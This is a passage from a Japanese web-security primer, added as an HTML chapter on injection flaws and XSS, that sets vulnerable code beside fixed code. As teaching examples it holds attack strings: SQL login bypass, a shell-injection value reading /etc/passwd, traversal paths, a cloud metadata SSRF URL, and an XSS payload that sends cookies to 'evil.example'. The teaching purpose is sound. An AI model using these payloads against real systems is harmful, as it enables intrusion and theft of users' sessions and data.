@@ -1,0 +1,472 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>入力が原因の脆弱性：インジェクションと XSS | 開発者のためのセキュリティ入門</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+<style>
+  .demo-grid { display: grid; gap: 10px; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); margin-top: 10px; }
+  .demo-grid .lbl { font-size: .8rem; font-weight: 800; color: var(--ink-2); margin-bottom: 4px; }
+  .demo-grid .lbl.ng { color: var(--red); }
+  .demo-grid .lbl.ok { color: var(--green); }
+  .samples { display: flex; gap: 6px; flex-wrap: wrap; margin: 8px 0; }
+</style>
+</head>
+<body data-root="../" data-page="ch03">
+<main class="wrap">
+<div class="breadcrumb"><a href="../index.html">ホーム</a> › 第3章</div>
+<p><span class="badge impl">実装</span></p>
+<h1>第3章 入力が原因の脆弱性：インジェクションと XSS</h1>
+<p class="lead">「利用者が入力した文字列が、命令として実行されてしまう」。この1つの原理から、SQL インジェクション・OS コマンドインジェクション・パストラバーサル・SSRF・XSS が生まれます。この章では、原理を1枚の図で押さえたうえで、それぞれ「何が起きる → なぜ → どう防ぐ → どう確かめる」の順に、危険なコードと安全なコードを並べて見ていきます。</p>
+
+<div class="box goal">
+  <div class="box-title"><span class="em">🧭</span>この章で理解してほしいこと</div>
+  <ul style="margin:0">
+    <li><b>原理は1つ：データと命令の混同</b>。入力を文字列連結で命令に混ぜると、入力の中の記号が命令の一部になる
+      <ul>
+        <li>SQL なら <code>'</code>、OS コマンドなら <code>;</code> や <code>|</code>、HTML なら <code>&lt;</code>、パスなら <code>../</code></li>
+        <li>対策の共通形は「入力を<b>値</b>として渡す仕組みを使う」＋「入力の<b>形</b>を許可リストで検証する」</li>
+      </ul>
+    </li>
+    <li><b>SQL インジェクションはプレースホルダで防ぐ</b>：Python sqlite3 の <code>?</code>、psycopg の <code>%s</code>、Node mysql2 の <code>?</code>、ORM
+      <ul>
+        <li>ORM でも生 SQL を文字列でつなげば同じ穴。ORDER BY の列名や LIKE の記号は値渡しできないので許可リストで決める</li>
+        <li>確かめ方：入力欄に <code>'</code> を1文字入れてエラーが出れば危険の疑い</li>
+      </ul>
+    </li>
+    <li><b>OS コマンドは呼ばない</b>。呼ぶなら <code>subprocess.run([...])</code>・<code>execFile</code> で引数を配列にし、シェルを経由しない</li>
+    <li><b>パストラバーサルは「ファイル名を利用者に決めさせない」</b>。ID から対応表で引くか、<code>realpath</code> で正規化して基準ディレクトリ配下かを確かめる</li>
+    <li><b>SSRF はサーバーが取りに行く先を許可リストで縛る</b>。内部アドレス（<code>169.254.169.254</code>、<code>10.x</code>、<code>127.x</code>）を拒否し、クラウドは IMDSv2 を使う</li>
+    <li><b>XSS はテンプレートの自動エスケープに任せる</b>：<code>|safe</code>・<code>innerHTML</code>・<code>dangerouslySetInnerHTML</code>・<code>v-html</code> を使わない
+      <ul>
+        <li>3種類：反射型（URL に仕込む）、格納型（投稿に仕込む）、DOM 型（ブラウザ側 JS が原因）</li>
+        <li>できること：セッション Cookie の窃取、偽ログイン画面、利用者になりすました操作</li>
+        <li>保険：Cookie に HttpOnly、CSP（Content-Security-Policy）</li>
+      </ul>
+    </li>
+    <li><b>ファイルアップロードは「名前も種類も信じない」</b>：保存名はサーバーが付け、中身で種類を判定し、公開ディレクトリに実行可能なものを置かない</li>
+    <li><b>入力検証とエスケープは別物で、両方要る</b>：検証は「形」を見てサーバー側で弾く（pydantic・zod）、エスケープは「出力先」に合わせて記号を無害化する</li>
+    <li><b>確かめ方</b>：手で <code>' " &lt; &gt; ../</code> を入れてみる → 異常系の自動テスト → SAST（Semgrep・CodeQL）→ DAST（OWASP ZAP）は自分の環境だけ</li>
+  </ul>
+  <p class="muted" style="margin:.7em 0 0;font-size:.9rem">読み終えたら、本文を見ずに各項目を自分の言葉で説明できるか確かめてください。</p>
+</div>
+
+<div class="box map">
+  <div class="box-title"><span class="em">🗺️</span>この章の全体像</div>
+  <ol style="margin:0">
+    <li>共通の原理：データと命令の混同</li>
+    <li>SQL インジェクション</li>
+    <li>OS コマンドインジェクション・パストラバーサル・SSRF</li>
+    <li>XSS（クロスサイトスクリプティング）</li>
+    <li>CSP：XSS の保険</li>
+    <li>ファイルアップロード</li>
+    <li>入力検証の設計</li>
+    <li>確かめ方</li>
+  </ol>
+  <p style="margin:.9em 0 .2em"><b>読む前の問い</b><small class="muted">（答えを予測してから読み進め、読み終えたら答え合わせをしてください）</small></p>
+  <ul style="margin:0">
+    <li>ログイン画面のパスワード欄に <code>' OR '1'='1</code> と入れると、なぜログインできてしまうことがあるのか。</li>
+    <li>ORM を使っていれば SQL インジェクションは起きないと言えるか。</li>
+    <li>掲示板の投稿を画面に出すとき、<code>&lt;script&gt;</code> を削除すれば XSS は防げるか。</li>
+  </ul>
+</div>
+
+<h2 id="principle">1. 共通の原理：データと命令の混同</h2>
+<p>プログラムは「命令」（SQL 文、シェルコマンド、HTML のタグ）と「データ」（利用者の名前、検索語、コメント）を扱います。この2つを<b>1本の文字列につなげてから</b>解釈する部品（DB、シェル、ブラウザ）に渡すと、部品はどこまでが命令でどこからがデータかを区別できません。データの中に命令の記号が入っていれば、それは命令として実行されます。これが<span class="term" data-tip="インジェクション（injection）：利用者の入力を命令に「注入」して、意図しない命令を実行させる攻撃の総称。">インジェクション</span>です。</p>
+
+<div class="diagram">
+  <div class="dtitle">入力が命令の一部として解釈されるまで</div>
+  <div class="flow wrap-ok mobile-col">
+    <div class="node"><img src="../assets/icons/threat/skull.svg" alt="">攻撃者<small>入力欄に記号入りの文字列</small></div>
+    <div class="arr">→</div>
+    <div class="node"><img src="../assets/icons/asset/code.svg" alt="">アプリ<small>命令 + 入力 を文字列連結</small></div>
+    <div class="arr ng">→</div>
+    <div class="node"><img src="../assets/icons/asset/database.svg" alt="">DB／シェル／ブラウザ<small>全部を命令として解釈</small></div>
+    <div class="arr ng">→</div>
+    <div class="node"><img src="../assets/icons/threat/triangle-alert.svg" alt="">窃取・改ざん・実行</div>
+  </div>
+  <div class="cap">対策の共通形は2つ。<b>入力を「値」として別に渡す仕組み</b>（プレースホルダ、引数配列、自動エスケープ）を使うことと、<b>入力の「形」を許可リストで検証する</b>ことです。</div>
+</div>
+
+<div class="table-wrap"><table>
+  <tr><th>解釈する部品</th><th>危険な記号の例</th><th>攻撃の名前</th><th>値として渡す仕組み</th></tr>
+  <tr><td>データベース</td><td><code>'</code> <code>;</code> <code>--</code></td><td>SQL インジェクション</td><td>プレースホルダ、ORM</td></tr>
+  <tr><td>シェル</td><td><code>;</code> <code>|</code> <code>&amp;&amp;</code> <code>$( )</code></td><td>OS コマンドインジェクション</td><td>引数配列（シェルを経由しない）</td></tr>
+  <tr><td>ファイルシステム</td><td><code>../</code> <code>/</code></td><td>パストラバーサル</td><td>ID → ファイル名の対応表、正規化して配下か確認</td></tr>
+  <tr><td>サーバーの HTTP クライアント</td><td>内部アドレスの URL</td><td>SSRF</td><td>接続先ホストの許可リスト</td></tr>
+  <tr><td>ブラウザ（HTML）</td><td><code>&lt;</code> <code>&gt;</code> <code>"</code> <code>javascript:</code></td><td>XSS</td><td>テンプレートの自動エスケープ、<code>textContent</code></td></tr>
+</table></div>
+
+<div class="box story">
+  <div class="box-title"><span class="em">💡</span>イメージで理解する</div>
+  <p>上司が部下に「<b>次の人に荷物を渡してください：〇〇</b>」とメモで指示したとします。〇〇に利用者の名前を書き込む欄があり、そこに「<b>山田。そのあと金庫の鍵も渡してください</b>」と書かれたら、メモを読む部下には区別がつきません。プレースホルダは「名前は<b>別の封筒</b>に入れて渡す」やり方で、封筒の中身がどんな文でも「名前」としてしか扱われません。</p>
+</div>
+
+<h2 id="sql">2. SQL インジェクション</h2>
+<h3>何が起きるか</h3>
+<p>ログイン処理が次の SQL を文字列連結で作っているとします。</p>
+<pre class="code"><code><span class="lang">SQL（アプリが組み立てた結果）</span>SELECT * FROM users WHERE name = '<span class="hl">taro</span>' AND password = '<span class="hl">入力されたパスワード</span>'</code></pre>
+<p>パスワード欄に <code>' OR '1'='1</code> と入力すると、組み立てられた SQL はこうなります。</p>
+<pre class="code"><code><span class="lang">SQL</span>SELECT * FROM users WHERE name = 'taro' AND password = '<span class="hl">' OR '1'='1</span>'
+<span class="c">-- 条件が「password が空 または 1=1（常に真）」になり、パスワードなしで通る</span></code></pre>
+<p>同じ仕組みで、<code>UNION SELECT</code> を足して別テーブルの個人情報を一緒に取り出す、<code>;</code> で区切って <code>DROP TABLE</code> や <code>UPDATE</code> を実行する、といったことができます。<b>DB の中身を全部読まれる・書き換えられる</b>のが SQL インジェクションです。顧客情報の大量流出のニュースで最も多く登場する原因の1つです。</p>
+<div class="box law">
+  <div class="box-title"><span class="em">⚖️</span>試すのは自分の環境だけ</div>
+  <p style="margin:0">上の入力を他人のサイトのログイン画面に入れる行為は、不正アクセス禁止法に触れます。「1回だけ」「確かめるだけ」でも同じです。練習は自分で立てた環境か、<a href="study-method.html#materials">練習用の教材</a>で行ってください。</p>
+</div>
+
+<h3>なぜ起きるか</h3>
+<p>原因は常に1つ、<b>SQL 文と入力値を文字列連結で1本にしてから DB に渡している</b>ことです。言語やフレームワークは関係ありません。</p>
+<div class="compare">
+  <div class="ng"><div class="lbl">✗ 危険な例：文字列連結（f 文字列・+・format）</div>
+<pre class="code"><code><span class="lang">Python</span>name = request.form["name"]
+pw   = request.form["password"]
+cur.execute(<span class="hl">f"SELECT * FROM users WHERE name = '{name}' AND password = '{pw}'"</span>)</code></pre>
+<div class="why">f 文字列・<code>+</code>・<code>%</code>・<code>.format()</code> のどれでも同じ。見た目は便利ですが、入力の <code>'</code> が文の区切りになります。</div></div>
+  <div class="ok"><div class="lbl">✓ 安全な例：プレースホルダ</div>
+<pre class="code"><code><span class="lang">Python（sqlite3）</span>name = request.form["name"]
+cur.execute(
+    <span class="ok">"SELECT * FROM users WHERE name = ?"</span>,
+    <span class="ok">(name,)</span>,
+)
+<span class="c"># psycopg（PostgreSQL）なら "... WHERE name = %s", (name,)</span></code></pre>
+<div class="why">SQL 文は固定で、値は別に渡します。DB ドライバが値を「値」としてだけ扱うので、<code>'</code> が入っていても文は変わりません。パスワードはそもそも SQL で比較せず、<a href="04-auth-session.html#password">第4章</a>の方法でハッシュを照合します。</div></div>
+</div>
+<div class="compare">
+  <div class="ng"><div class="lbl">✗ 危険な例：Node.js で連結</div>
+<pre class="code"><code><span class="lang">JavaScript（mysql2）</span>const sql = <span class="hl">"SELECT * FROM users WHERE name = '" + req.body.name + "'"</span>;
+const [rows] = await conn.query(sql);</code></pre>
+<div class="why">テンプレートリテラル（<code>`... ${name}`</code>）でも同じです。</div></div>
+  <div class="ok"><div class="lbl">✓ 安全な例：<code>?</code> と値の配列</div>
+<pre class="code"><code><span class="lang">JavaScript（mysql2）</span>const [rows] = await conn.execute(
+  <span class="ok">"SELECT * FROM users WHERE name = ?"</span>,
+  <span class="ok">[req.body.name]</span>
+);</code></pre>
+<div class="why">ORM（Prisma、Sequelize、SQLAlchemy、Django ORM など）を普通に使えば内部でこの形になります。</div></div>
+</div>
+
+<h3>どう防ぐか</h3>
+<ul>
+  <li><b>プレースホルダ</b>を使う。これが根本的な対策で、エスケープ処理の自作は不要です。</li>
+  <li><b>ORM を使う</b>。ただし ORM の「生 SQL」機能（<code>raw()</code>、<code>$queryRawUnsafe</code>、<code>text()</code> など）に文字列連結で入力を混ぜれば同じ穴です。生 SQL を使うときもプレースホルダを使います。</li>
+  <li><b>プレースホルダにできない部分は許可リスト</b>。テーブル名・列名（ORDER BY の並び順の指定など）は値として渡せません。利用者の入力をそのまま使わず、対応表から選びます。</li>
+  <li><b>LIKE の記号</b>（<code>%</code>・<code>_</code>）は値として渡してもワイルドカードとして働くので、「全件一致で重い検索をさせられる」ことがあります。必要なら <code>ESCAPE</code> 句で無効化します。</li>
+  <li><b>DB 接続の権限は最小</b>に。アプリ用の DB ユーザーに <code>DROP</code> や他スキーマの権限を与えなければ、万一のときの被害が小さくなります。</li>
+</ul>
+<pre class="code"><code><span class="lang">Python：ORDER BY の列名は許可リストで決める</span>SORT_COLUMNS = {"name": "name", "created": "created_at", "price": "price"}
+col = SORT_COLUMNS.get(request.args.get("sort"), "created_at")  <span class="c"># 対応表にない値は既定値に</span>
+cur.execute(f"SELECT id, name FROM items ORDER BY {col}")      <span class="c"># col は対応表の値だけ。入力そのものは入らない</span></code></pre>
+
+<h3>どう確かめるか</h3>
+<ul>
+  <li>入力欄・URL パラメータに <code>'</code>（シングルクォート1文字）を入れる。500 エラーや DB のエラーメッセージが出れば、文字列連結の疑いが濃い。</li>
+  <li>リポジトリで <code>execute(f"</code>、<code>execute("... " +</code>、<code>query(`</code>、<code>raw(</code> を検索し、入力が混ざっていないか見る。</li>
+  <li>SAST（<a href="#testing">8節</a>）は文字列連結の SQL を機械的に見つけられます。</li>
+</ul>
+<div class="box news">
+  <div class="box-title"><span class="em">📰</span>ニュースではこう報じられる</div>
+  <p>「〇〇のウェブサイトに<b>SQL インジェクション</b>攻撃。<b>顧客情報〇万件が流出した可能性</b>。<b>クレジットカード情報を含む</b>」。読み方：入口は入力（第1章の①）、壊れたのは機密性。多くの場合、原因は古い検索機能やお問い合わせフォームの文字列連結です。自分のシステムでは「生 SQL を文字列で組み立てている箇所はないか」をその日のうちに検索します。</p>
+</div>
+
+<h2 id="command">3. OS コマンドインジェクション・パストラバーサル・SSRF</h2>
+<p>SQL と同じ原理が、シェル・ファイルシステム・サーバーからの HTTP 通信でも起きます。3つまとめて見ます。</p>
+
+<h3>OS コマンドインジェクション</h3>
+<p><b>何が起きるか</b>：画像変換や ping などで外部コマンドを呼ぶとき、入力を混ぜていると、<code>;</code> や <code>|</code> の後ろに書かれた任意のコマンドがサーバーで実行されます。サーバーの乗っ取り（RCE）に直結する、最も深刻な種類です。</p>
+<div class="compare">
+  <div class="ng"><div class="lbl">✗ 危険な例：シェル経由で文字列を渡す</div>
+<pre class="code"><code><span class="lang">Python</span>host = request.args["host"]
+subprocess.run(<span class="hl">f"ping -c 1 {host}"</span>, <span class="hl">shell=True</span>)
+<span class="c"># host に "example.com; cat /etc/passwd" が来ると両方実行される</span></code></pre>
+<div class="why"><code>shell=True</code> は入力をシェルに解釈させます。Node の <code>child_process.exec("ping " + host)</code> も同じです。</div></div>
+  <div class="ok"><div class="lbl">✓ 安全な例：引数を配列で、シェルを経由しない</div>
+<pre class="code"><code><span class="lang">Python</span>host = request.args["host"]
+if not re.fullmatch(r"[A-Za-z0-9.-]{1,253}", host):  <span class="c"># 形も許可リストで検証</span>
+    abort(400)
+subprocess.run(<span class="ok">["ping", "-c", "1", host]</span>, check=True, timeout=5)</code></pre>
+<div class="why">配列で渡すと <code>host</code> は1つの引数としてだけ扱われます。Node なら <code>execFile("ping", ["-c", "1", host])</code>。さらに良いのは<b>コマンドを呼ばない</b>こと（画像処理なら Pillow や sharp などのライブラリ）。</div></div>
+</div>
+<p>配列にしても、入力が <code>-</code> で始まるとコマンドのオプションとして解釈されることがあります。入力の形（英数字と <code>.</code> <code>-</code> だけ、先頭は英数字）を検証し、可能なコマンドでは <code>--</code> でオプションの終わりを示します。</p>
+
+<h3 id="path">パストラバーサル（ディレクトリトラバーサル）</h3>
+<p><b>何が起きるか</b>：「ファイル名を受け取って返す」機能で、<code>../../etc/passwd</code> や <code>..\..\config\database.yml</code> のような名前を渡され、公開するつもりのないファイル（設定ファイル、鍵、ソースコード）を読まれます。書き込み機能なら上書きもされます。</p>
+<div class="compare">
+  <div class="ng"><div class="lbl">✗ 危険な例：入力をそのままパスに</div>
+<pre class="code"><code><span class="lang">Python</span>name = request.args["file"]
+path = os.path.join(UPLOAD_DIR, <span class="hl">name</span>)
+return send_file(path)
+<span class="c"># name が "../../.env" なら UPLOAD_DIR の外を読む</span>
+<span class="c"># name が "/etc/passwd"（絶対パス）だと join は UPLOAD_DIR を捨てる</span></code></pre>
+<div class="why"><code>os.path.join</code> は <code>..</code> を解決しないうえ、絶対パスが来ると前の部分を捨てます。</div></div>
+  <div class="ok"><div class="lbl">✓ 安全な例：正規化して基準ディレクトリ配下か確認</div>
+<pre class="code"><code><span class="lang">Python</span>base = os.path.realpath(UPLOAD_DIR)
+path = os.path.realpath(os.path.join(base, request.args["file"]))
+<span class="ok">if os.path.commonpath([base, path]) != base:</span>
+    abort(400)          <span class="c"># base の外を指していたら拒否</span>
+return send_file(path)</code></pre>
+<div class="why"><code>realpath</code> で <code>..</code> とシンボリックリンクを解決してから、基準ディレクトリの中かを確かめます。Node なら <code>path.resolve(base, name)</code> の結果が <code>base + path.sep</code> で始まるかを見ます。</div></div>
+</div>
+<p>最も確実なのは、<b>利用者にファイル名を決めさせない</b>ことです。ダウンロード対象は DB の ID で指定させ、実際のファイルパスはサーバー側の対応表から引きます。</p>
+
+<h3 id="ssrf">SSRF（サーバーサイドリクエストフォージェリ）</h3>
+<p><b>何が起きるか</b>：「URL を指定するとサーバーがその内容を取ってくる」機能（Web ページのプレビュー、画像の取り込み、Webhook）で、攻撃者が<b>内部ネットワークの URL</b>を指定します。サーバーはネットワークの内側にいるので、外からは届かない内部 API や、クラウドの<span class="term" data-tip="メタデータサービス：クラウドの仮想マシンから 169.254.169.254 にアクセスすると、そのマシンの情報や一時的な認証情報が取れる仕組み。">メタデータサービス</span>（<code>http://169.254.169.254/</code>）に届いてしまい、クラウドの認証情報を盗まれることがあります。</p>
+<div class="compare">
+  <div class="ng"><div class="lbl">✗ 危険な例：利用者の URL をそのまま取得</div>
+<pre class="code"><code><span class="lang">Python</span>url = request.args["url"]
+r = requests.get(<span class="hl">url</span>, timeout=5)
+return r.text
+<span class="c"># url=http://169.254.169.254/latest/meta-data/ で認証情報が返る</span></code></pre>
+<div class="why">「http で始まるか」だけの確認では防げません。リダイレクトで内部に飛ばされることもあります。</div></div>
+  <div class="ok"><div class="lbl">✓ 安全な例：接続先を許可リストで縛る</div>
+<pre class="code"><code><span class="lang">Python</span>ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}
+u = urllib.parse.urlparse(request.args["url"])
+<span class="ok">if u.scheme != "https" or u.hostname not in ALLOWED_HOSTS:</span>
+    abort(400)
+r = requests.get(u.geturl(), timeout=5, <span class="ok">allow_redirects=False</span>)</code></pre>
+<div class="why">「取りに行ってよい先」を列挙するのが基本です。任意の URL を許す必要があるなら、DNS を引いた結果が内部アドレス（<code>10.0.0.0/8</code>、<code>172.16.0.0/12</code>、<code>192.168.0.0/16</code>、<code>127.0.0.0/8</code>、<code>169.254.0.0/16</code>、<code>::1</code>）なら拒否し、リダイレクト先も再検証します。AWS では IMDSv2（トークン必須）を有効にすると、メタデータの窃取が難しくなります。</div></div>
+</div>
+
+<h2 id="xss">4. XSS（クロスサイトスクリプティング）</h2>
+<h3>何が起きるか</h3>
+<p>利用者の入力を HTML にそのまま埋め込むと、入力の中の <code>&lt;script&gt;</code> や <code>onerror="..."</code> が、<b>そのページを見た別の利用者のブラウザで</b>実行されます。攻撃者が書いた JavaScript が、あなたのサイトの一部として動くのが <span class="term" data-tip="XSS（Cross-Site Scripting）：Web ページに悪意あるスクリプトを埋め込み、閲覧者のブラウザで実行させる攻撃。">XSS</span> です。できることは、<b>セッション Cookie の窃取</b>（なりすまし）、<b>偽のログイン画面</b>の表示（パスワード窃取）、<b>利用者になりすました操作</b>（送金・投稿・設定変更）、キー入力の記録、です。</p>
+<div class="table-wrap"><table>
+  <tr><th>種類</th><th>仕込む場所</th><th>例</th></tr>
+  <tr><td><b>反射型</b></td><td>URL のパラメータ。リンクを踏ませる</td><td>検索結果ページが <code>?q=</code> の中身をそのまま表示する</td></tr>
+  <tr><td><b>格納型</b></td><td>DB に保存される投稿・プロフィール。見た全員に効く</td><td>掲示板のコメント、商品レビュー、表示名</td></tr>
+  <tr><td><b>DOM 型</b></td><td>ブラウザ側の JavaScript が URL などを <code>innerHTML</code> に入れる</td><td><code>location.hash</code> の値をそのまま画面に差し込む</td></tr>
+</table></div>
+
+<h3>なぜ起きるか</h3>
+<p>HTML にとって <code>&lt;</code> はタグの始まり、<code>"</code> は属性値の終わりです。入力をそのまま埋め込むと、入力の記号が HTML の構造を変えます。防ぐには、<b>出力するときに記号を文字として表示される形（<code>&amp;lt;</code> など）に変換する</b>＝<span class="term" data-tip="エスケープ：記号を文字として扱うよう変換すること。HTML では < を &lt; に変える。">エスケープ</span>します。</p>
+<div class="compare">
+  <div class="ng"><div class="lbl">✗ 危険な例：HTML を文字列で組み立てる</div>
+<pre class="code"><code><span class="lang">JavaScript（Express）</span>app.get("/search", (req, res) =&gt; {
+  res.send(<span class="hl">`&lt;p&gt;「${req.query.q}」の検索結果&lt;/p&gt;`</span>);
+});
+<span class="c">// q=&lt;script&gt;fetch("https://evil.example/?c="+document.cookie)&lt;/script&gt;</span></code></pre>
+<div class="why">サーバー側でもブラウザ側でも、HTML を文字列連結で作るのが原因です。</div></div>
+  <div class="ok"><div class="lbl">✓ 安全な例：テンプレートの自動エスケープに任せる</div>
+<pre class="code"><code><span class="lang">Jinja2 / Django テンプレート</span>&lt;p&gt;「<span class="ok">{{ q }}</span>」の検索結果&lt;/p&gt;
+<span class="c">{# {{ q|safe }} は自動エスケープを切る。使わない #}</span></code></pre>
+<pre class="code"><code><span class="lang">EJS</span>&lt;p&gt;「<span class="ok">&lt;%= q %&gt;</span>」の検索結果&lt;/p&gt;
+<span class="c">&lt;%# &lt;%- q %&gt; はエスケープしない。使わない %&gt;</span></code></pre>
+<div class="why">主要なテンプレートエンジンは既定でエスケープします。危ないのは<b>既定を外す書き方</b>です。</div></div>
+</div>
+<div class="compare">
+  <div class="ng"><div class="lbl">✗ 危険な例：DOM 型（ブラウザ側）</div>
+<pre class="code"><code><span class="lang">JavaScript（ブラウザ）</span>const name = new URLSearchParams(location.search).get("name");
+document.getElementById("hello").<span class="hl">innerHTML</span> = "こんにちは、" + name + "さん";</code></pre>
+<div class="why"><code>innerHTML</code>、<code>document.write</code>、jQuery の <code>.html()</code>、<code>eval</code> が原因になります。</div></div>
+  <div class="ok"><div class="lbl">✓ 安全な例：<code>textContent</code> で文字として入れる</div>
+<pre class="code"><code><span class="lang">JavaScript（ブラウザ）</span>const name = new URLSearchParams(location.search).get("name");
+document.getElementById("hello").<span class="ok">textContent</span> = "こんにちは、" + name + "さん";</code></pre>
+<div class="why">React の <code>{name}</code>、Vue の <code>{{ name }}</code> はエスケープされます。<code>dangerouslySetInnerHTML</code>・<code>v-html</code> は名前のとおり危険で、どうしても HTML を出すなら DOMPurify でサニタイズしてから使います。</div></div>
+</div>
+
+<h3>文脈ごとに正しいエスケープが違う</h3>
+<div class="table-wrap"><table>
+  <tr><th>埋め込む場所</th><th>危険</th><th>対策</th></tr>
+  <tr><td>タグの中身 <code>&lt;p&gt;ここ&lt;/p&gt;</code></td><td><code>&lt;script&gt;</code></td><td>HTML エスケープ（<code>&lt; &gt; &amp; " '</code>）。テンプレートの既定</td></tr>
+  <tr><td>属性値 <code>&lt;input value="ここ"&gt;</code></td><td><code>" onfocus="..."</code> で属性を追加される</td><td>属性値は必ず <code>"</code> で囲み、HTML エスケープ</td></tr>
+  <tr><td>URL <code>&lt;a href="ここ"&gt;</code></td><td><code>javascript:alert(1)</code></td><td>スキームが <code>http:</code>／<code>https:</code> かを確認。それ以外は捨てる</td></tr>
+  <tr><td>JavaScript の中 <code>&lt;script&gt;var x = "ここ"&lt;/script&gt;</code></td><td><code>"; 任意のコード; "</code></td><td>原則やらない。必要なら JSON にして <code>data-</code> 属性に入れ、JS 側で読む</td></tr>
+  <tr><td>イベント属性 <code>onclick="ここ"</code></td><td>何を入れても実行される</td><td>利用者の入力は入れない</td></tr>
+</table></div>
+<div class="box warn">
+  <div class="box-title"><span class="em">⚠️</span>間違えやすい点：「<code>&lt;script&gt;</code> を削除すれば安全」ではない</div>
+  <p>タグを削除する方式（ブロックリスト）は、<code>&lt;img src=x onerror=alert(1)&gt;</code>、<code>&lt;svg onload=...&gt;</code>、大文字小文字の混在、文字コードの工夫など、無数の回避方法があります。<b>出力時のエスケープ</b>が正解で、入力時の削除は対策になりません。HTML を許可する必要があるときだけ、実績のあるサニタイザー（DOMPurify）を使います。</p>
+</div>
+
+<div class="box">
+  <div class="box-title"><span class="em">🧪</span>体験：エスケープで何が変わるか</div>
+  <p class="muted" style="margin-top:0">下の欄に文字列を入れると、HTML にそのまま埋め込んだ場合・エスケープした場合・SQL に文字列連結した場合・プレースホルダの場合の違いが見られます。この画面では結果を「文字」として表示しているだけなので、何を入れてもスクリプトは実行されません。</p>
+  <div class="samples">
+    <button class="chip" type="button" data-sample="太郎">太郎</button>
+    <button class="chip" type="button" data-sample="&lt;script&gt;alert(1)&lt;/script&gt;">&lt;script&gt;alert(1)&lt;/script&gt;</button>
+    <button class="chip" type="button" data-sample="&lt;img src=x onerror=alert(1)&gt;">&lt;img src=x onerror=…&gt;</button>
+    <button class="chip" type="button" data-sample="' OR '1'='1">' OR '1'='1</button>
+    <button class="chip" type="button" data-sample="O'Brien">O'Brien（正当な入力）</button>
+  </div>
+  <input class="field" id="esc-in" type="text" value="&lt;script&gt;alert(1)&lt;/script&gt;" aria-label="入力文字列" autocomplete="off">
+  <div class="demo-grid">
+    <div><div class="lbl ng">✗ HTML にそのまま埋め込んだマークアップ</div><div class="out" id="esc-raw"></div></div>
+    <div><div class="lbl ok">✓ HTML エスケープ後</div><div class="out" id="esc-escaped"></div></div>
+    <div><div class="lbl ng">✗ SQL に文字列連結した結果</div><div class="out" id="esc-sql"></div></div>
+    <div><div class="lbl ok">✓ プレースホルダ（文と値が分かれている）</div><div class="out" id="esc-ph"></div></div>
+  </div>
+  <p class="muted" style="margin-bottom:0" id="esc-note"></p>
+</div>
+
+<h3>どう確かめるか</h3>
+<ul>
+  <li>入力欄・URL パラメータに <code>&lt;b&gt;test&lt;/b&gt;</code> を入れる。太字で表示されたら、エスケープされていません。</li>
+  <li>リポジトリで <code>|safe</code>、<code>mark_safe</code>、<code>&lt;%-</code>、<code>innerHTML</code>、<code>dangerouslySetInnerHTML</code>、<code>v-html</code>、<code>.html(</code> を検索し、利用者の入力が入っていないかを見る。</li>
+  <li>保険として、セッション Cookie に <code>HttpOnly</code>（<a href="04-auth-session.html#cookie">第4章</a>）と、次節の CSP を入れる。</li>
+</ul>
+
+<h2 id="csp">5. CSP：XSS の保険</h2>
+<p><span class="term" data-tip="CSP（Content-Security-Policy）：このページで実行してよいスクリプトや読み込んでよいリソースの出所を、サーバーがブラウザに指示する応答ヘッダー。">CSP</span> は、「このページでは、どこから読み込んだスクリプトだけを実行してよいか」をサーバーがブラウザに伝える応答ヘッダーです。エスケープ漏れがあっても、攻撃者のスクリプトが実行されにくくなります。<b>根本対策（エスケープ）の代わりではなく、保険</b>です。</p>
+<pre class="code"><code><span class="lang">HTTP 応答ヘッダー</span>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-R4nd0mV4lue'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'</code></pre>
+<div class="table-wrap"><table>
+  <tr><th>指定</th><th>意味</th></tr>
+  <tr><td><code>default-src 'self'</code></td><td>指定のない種類のリソースは、自分のオリジンからだけ読み込む</td></tr>
+  <tr><td><code>script-src 'self' 'nonce-…'</code></td><td>スクリプトは自分のオリジンのファイルか、リクエストごとに生成した <span class="term" data-tip="nonce（ノンス）：1回限りのランダムな値。CSP では、サーバーが応答ごとに生成して許可するインラインスクリプトに付ける。">nonce</span> が付いた <code>&lt;script nonce="…"&gt;</code> だけ実行する。インラインの <code>&lt;script&gt;</code> や <code>onclick=</code> は実行されない</td></tr>
+  <tr><td><code>object-src 'none'</code></td><td>プラグイン（Flash など古い仕組み）を禁止</td></tr>
+  <tr><td><code>base-uri 'self'</code></td><td><code>&lt;base&gt;</code> で相対 URL の基準を書き換えられるのを防ぐ</td></tr>
+  <tr><td><code>frame-ancestors 'none'</code></td><td>他サイトの iframe に埋め込まれない（クリックジャッキング対策、<a href="04-auth-session.html#clickjacking">第4章</a>）</td></tr>
+</table></div>
+<div class="box exam">
+  <div class="box-title"><span class="em">🛠️</span>実務ではこうする：まず Report-Only で試す</div>
+  <p>いきなり有効にすると、インラインスクリプトや外部の解析タグが止まって画面が壊れます。最初は <code>Content-Security-Policy-Report-Only:</code> ヘッダーで「違反を報告するだけ」の状態にし、報告先（<code>report-to</code>）に届く違反を見ながら、インラインスクリプトを外部ファイル化するか nonce を付けていきます。違反が出なくなったら本番のヘッダーに切り替えます。<code>'unsafe-inline'</code> を入れると保険の意味がほぼなくなるので、避けます。</p>
+</div>
+
+<h2 id="upload">6. ファイルアップロード</h2>
+<p><b>何が起きるか</b>：「画像だけ受け付けるつもり」のアップロード機能に、拡張子を偽装したプログラム（<code>.php</code>、<code>.jsp</code>、<code>.html</code> など）を置かれ、公開ディレクトリからそれが実行・表示されてサーバー乗っ取りや XSS につながります。ファイル名に <code>../</code> を入れて別の場所に書き込まれる（パストラバーサル）、巨大なファイルでディスクを埋められる（可用性）、もあります。</p>
+<div class="compare">
+  <div class="ng"><div class="lbl">✗ 危険な例：名前も種類も信じる</div>
+<pre class="code"><code><span class="lang">Python（Flask）</span>f = request.files["photo"]
+if <span class="hl">f.content_type.startswith("image/")</span>:          <span class="c"># 送り手が自由に書ける値</span>
+    f.save(os.path.join("static/uploads", <span class="hl">f.filename</span>))  <span class="c"># 名前もそのまま、公開ディレクトリに</span></code></pre>
